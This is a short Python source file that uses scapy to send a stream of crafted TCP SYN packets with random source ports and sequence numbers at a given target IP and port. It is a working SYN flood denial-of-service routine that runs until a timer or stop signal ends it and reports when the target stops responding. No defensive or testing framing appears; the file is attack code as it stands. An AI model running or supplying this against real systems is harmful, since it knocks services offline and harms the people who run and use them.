from scapy.all import IP, TCP, send
import random
import time

def launch(target_ip, port, duration, tag, stop_event, fail_tracker):
    start_time = time.time()

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            break

        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(
            sport=random.randint(1024, 65535),
            dport=port,
            flags="S",
            seq=random.randint(0, 4294967295)
        )

        try:
            send(ip_layer / tcp_layer, verbose=0)
            fail_tracker['sent'] += 1
        except Exception:
            fail_tracker['fail'] += 1

        if fail_tracker['fail'] > 20:
            print(f"[x] {tag} target seems unresponsive. Stopping.")
            break

        time.sleep(0.01)
